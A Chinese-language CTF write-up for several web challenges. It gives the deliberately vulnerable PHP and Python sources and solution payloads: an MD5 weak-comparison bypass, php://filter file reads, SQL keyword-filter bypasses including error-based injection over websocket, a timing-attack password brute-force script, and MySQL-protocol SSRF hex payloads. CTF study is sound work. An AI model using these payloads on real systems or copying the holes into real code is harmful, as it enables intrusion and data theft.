### Web


* 签到

  ```php
  <?php
  include 'flag.php';
  show_source(__FILE__);
  if ($_GET['fafu']) {
  	$fafuGET = $_GET['fafu'];
  } else {
  	die("please give me get parament");
  }
  if ($_POST['fafu']) {
  	$fafuPost = $_POST['fafu'];
  } else {
  	die("please gie me post parament");
  }

  if (isset($fafuGET) && isset($fafuPost)) {
  	if ($fafuPost == $fafuGET) {
  		die("i not allow they are the same");
  	} else if (md5($fafuPost) == md5($fafuGET)) {
  		die("Flag:" . $flag);
  	}
  }
  ```

  了解GET, POST 提交, MD5 弱类型比较 

  ```php
  index.php?fafu=240610708

  post:
  fafu=QNKCDZO
  ```

  ​

* 文件包含

  ```php
  <?php
  error_reporting(0);
  if (!$_GET[file]) {echo '<a href="./index.php?file=show.php">click me? 	no</a>';}
  $file = $_GET['file'];
  if (strstr($file, "../") || stristr($file, "tp") || stristr($file, "input") || stristr($file, "data") || stristr($file, "environ") || stristr($file, "log")) {
      echo "Oh no!";
      exit();
  }
  include $file;
  // flag1111111111111111111.php
  ?>
  ```


文件包含，直接读取flag的文件即可，发现好多人把 flag1111111111111111111 当做 flag 提交 . emmm, 坑

```php
payload:

index.php?file=php://filter/convert.base64-encode/resource=index.php
index.php?file=php://filter/convert.base64-encode/resource=flag1111111111111111111.php
```



* PHP弱类型

  ```php
  <?php
  show_source(__FILE__);
  $v1 = 0;
  $v2 = 0;
  $v3 = 0;
  $v4 = 0;
  $a = (array) json_decode(@$_GET['a']);
  if (is_array($a)) {
      is_numeric(@$a["a1"]) ? die("nope") : null;
      if (@$a["a1"]) {
          ($a["a1"] > 1336) ? $v1 = 1 : null;
      }
      if (is_array(@$a["a2"])) {
          if (count($a["a2"]) !== 5 or !is_array($a["a2"][0])) {
              die("nope");
          }

          $pos = array_search("ctf", $a["a2"]);
          $pos === false ? die("nope") : null;
          foreach ($a["a2"] as $key => $val) {
              $val === "ctf" ? die("nope") : null;
          }
          $v2 = 1;
      }
  }
  if (preg_match("/^([0-9]+\.?[0-9]+)+$/", @$_GET['b'])) {
      $b = json_decode(@$_GET['b']);
      if ($var = $b === null) {
          ($var === true) ? $v3 = 1 : null;
      }
  }

  $c = @$_GET['c'];
  $d = @$_GET['d'];
  if (@$c[1]) {
      if (!strcmp($c[1], $d) && $c[1] !== $d) {
          eregi("3|1|c", $d . $c[0]) ? die("nope") : null;
          strpos(($c[0] . $d), "31c3") ? $v4 = 1 : null;
      }
  }

  if ($v1 && $v2 && $v3 && $v4) {
      include "flag.php";
      echo $flag;
  }

  ```
  ​

其实这题是原题，但是环境用Linux 搭建，网上的 payload 有一部分就不能用了.  卡在b 参数上，网上是针对 json 的windows 特性,  b=0002 可以绕过，但是在linux 行不通，需要 FUZZ, 留个坑，这个payload 就不放了，大家可以自己FUZZ试试。

  

* 注入

```php
<?php
error_reporting(0);
include "conf.php";
show_source(__FILE__);
$link = @mysql_connect($host, $username, $password);
if (!$link) {
die('Could not connect: ' . mysqli_error());
}
mysql_select_db($dbname);

if (isset($_GET['id'])) {
$id = $_GET['id'];
} else {
die("input the get parament id");
}

$array = array('table', 'union', 'and', 'or', 'load_file', 'create', 'delete', 'select', 'update', 'sleep', 'alter', 'drop', 'truncate', 'from', 'max', 'min', 'order', 'limit');
foreach ($array as $value) {
if (substr_count($id, $value) > 0) {
exit('hacker keyword: ' . $value);
}
}

$id = strip_tags($id);

$query = "SELECT * FROM test WHERE id=$id LIMIT 1";
$result = mysql_query($query, $link);
while ($row = @mysql_fetch_array($result, MYSQL_ASSOC)) {
echo $row['username'] . "\n";
}
```

  ​


注入绕过，关键字被过滤， ```un<>ion``` 即可绕过过滤



* 登录密码枚举(题目忘了)

网页中有提示
```html
<!-- the user is admin, the length of password is 11 bit
do you know Time-Based Username Enumeration Attack ? -->
```

```php
<?php
include "flag.php";
if (isset($_POST['username']) && isset($_POST['password'])) {
	$password = $_POST['password'];
	$username = $_POST['username'];
	$right = "w3|C0m3f@Fu";
	$len = strlen($password);
	if ($len == 11) {
		if ($password === $right && $username === 'admin') {
			die($flag);
		}
		for ($i = 0; $i < $len; $i++) {
			if ($right[$i] === $password[$i]) {
				usleep(500000);
			} else {
				return;
			}
		}
	}
}
?>
```

用来拖延时间的，输入密码的一个正确的字符就给 sleep 0.5 秒. 写个py依次fuzz 字符的时间即可
```python
# -*- coding:utf-8 -*-

import string
import requests
import time

all_string_print = string.printable

url = "http://localhost:7777/login.php"

for i in all_string_print:
    data = {'username': 'admin', 'password': i + "aaaaaaaaaa"}
    start = time.time()
    req = requests.post(url, data)
    end = time.time()
    print(i, end - start)
```

依次爆破字符即可，当然网络存在延迟，需要多次校验payload
```
('u', 0.0036039352416992188)
('v', 0.0076448917388916016)
('w', 0.5050110816955566)
('x', 0.006390094757080078)
('y', 0.0055789947509765625)
```


* Chat With ME

```python
black_keyword = ['union', 'concat', 'or', 'exp', 'version', 'user', 'create', 'delete',
'sleep', 'alter', 'drop', 'truncate', 'max', 'min', 'order', 'limit', 'floor', 'extractvalue', 'GeometryCollection', 'polygon', 'multi', 'linestring']
```


其实考察点是 websocket 通信 + concat 绕过注入, 但是  盲注也是绕过的。 emmm.....

```python
import logging
import MySQLdb
import tornado.web
import tornado.ioloop
import tornado.httpserver
import tornado.websocket
import tornado.options


class Storage(dict):

    def __getitem__(self, item):
        return self[item]

    def __setitem__(self, key, value):
        self[key] = value


class WebSocketHandler(tornado.websocket.WebSocketHandler):

    def check_origin(self, origin):
        return True

    def open(self):
        self.send_message("Hello")
        # self.send_message("Hello2")

    def on_message(self, message):
        logging.info('Recv: %s' % message)
        black_keyword = ['union', 'concat', 'or', 'exp', 'version', 'user', 'create', 'delete',
                         'sleep', 'alter', 'drop', 'truncate', 'max', 'min', 'order', 'limit', 'floor', 'extractvalue', 'GeometryCollection', 'polygon', 'multi', 'linestring']
        for key in black_keyword:
            if(str(message).lower().find(key) != -1):
                self.send_message({'text': 'black key word'})
                self.close()
                return
        self.send_message(message)
        self.session = Storage()
        db = MySQLdb.connect(host="localhost", user="root",
                             passwd="toor", db="test", charset="utf8")
        cur = db.cursor()
        try:
            sql = "select table_name from information_schema.tables where table_schema='%s'" % message
            logging.info('Execute: %s' % sql)
            cur.execute(sql)
            data = cur.fetchall()[0]
            self.send_message({'text': data[0]})
        except Exception, e:
            self.send_message({'text': str(e)})
        cur.close()
        db.close()
        self.close()

    def on_close(self):
        logging.warning('Close')

    def send_message(self, message):
        logging.info('Send: %s' % message)
        self.write_message(message)


class Application(tornado.web.Application):

    def __init__(self):
        handlers = [
            ('/', WebSocketHandler),
        ]
        settings = dict(debug=True,)
        tornado.web.Application.__init__(self, handlers=handlers, **settings)


if __name__ == '__main__':
    http_server = tornado.httpserver.HTTPServer(Application())
    http_server.listen(9999, "0.0.0.0")
    logging.warning(
        'WebSocket Injection Proxy Listening on 0.0.0.0:9999')
    tornado.options.parse_command_line()
    tornado.ioloop.IOLoop.instance().start()
```



找个 websocket 客户端 连接通信即可, 注入即可, payload 如下

```' and 1=updatexml(1,make_set(3, '~',database()),1) #```

然后就是 balabala 注入flag了



* URL请求系统

  demo

  ```php
  <?php
  error_reporting(0);
  function curl($url) {
  	$ch = curl_init();
  	curl_setopt($ch, CURLOPT_URL, $url);
  	curl_setopt($ch, CURLOPT_HEADER, 0);
  	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
  	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.1 Safari/537.11');
  	curl_exec($ch);
  	curl_close($ch);
  }

  // message in the mysql database
  if (isset($_POST['url'])) {
  	$url = $_POST['url'];
  	curl($url);
  }

  ```

通过个人测试，这个对环境要求比较高，而且也是有坑的，只有自己测试了才知道。比赛环境是基于 Docker ubuntu 14.04 搭建的，payload 和下面kali测试的会不一样。比赛时需要选手有 docker ubuntu 14.04 环境，robots.txt 还特地说了下，需要镜像找我拷贝u盘. emmm.... 

在 Kali Linux 2018.1 amd64 测试，```mysql 的 root``` 密码是 ```root``` 还是 ```toor``` 有点忘了

payload

```
login:(success)
b400000185a63f20000000012d0000000000000000000000000000000000000000000000757365726e6f7061737300006d7973716c5f6e61746976655f70617373776f72640071035f6f731064656269616e2d6c696e75782d676e750c5f636c69656e745f6e616d65086c69626d7973716c045f70696404353435360f5f636c69656e745f76657273696f6e0731302e312e3239095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420310100000001

show database:(success)
b400000185a63f20000000012d0000000000000000000000000000000000000000000000757365726e6f7061737300006d7973716c5f6e61746976655f70617373776f72640071035f6f731064656269616e2d6c696e75782d676e750c5f636c69656e745f6e616d65086c69626d7973716c045f70696404383137340f5f636c69656e745f76657273696f6e0731302e312e3239095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420310f0000000373686f77206461746162617365730100000001

show database + show table in database + select(success)
b400000185a63f20000000012d0000000000000000000000000000000000000000000000757365726e6f7061737300006d7973716c5f6e61746976655f70617373776f72640071035f6f731064656269616e2d6c696e75782d676e750c5f636c69656e745f6e616d65086c69626d7973716c045f70696404353132380f5f636c69656e745f76657273696f6e0731302e312e3239095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420310f0000000373686f77206461746162617365730e0000000373656c65637420277465737427170000000373686f77207461626c657320696e20666166756374660d0000000373656c6563742027747474270100000001

select * from fafuctf.flag(success)
b400000185a63f20000000012d0000000000000000000000000000000000000000000000757365726e6f7061737300006d7973716c5f6e61746976655f70617373776f72640071035f6f731064656269616e2d6c696e75782d676e750c5f636c69656e745f6e616d65086c69626d7973716c045f70696404353238340f5f636c69656e745f76657273696f6e0731302e312e3239095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420311b0000000373656c656374202a2066726f6d20666166756374662e666c61670100000001
```

具体的可以参考这篇文章

http://www.91ri.org/17511.html
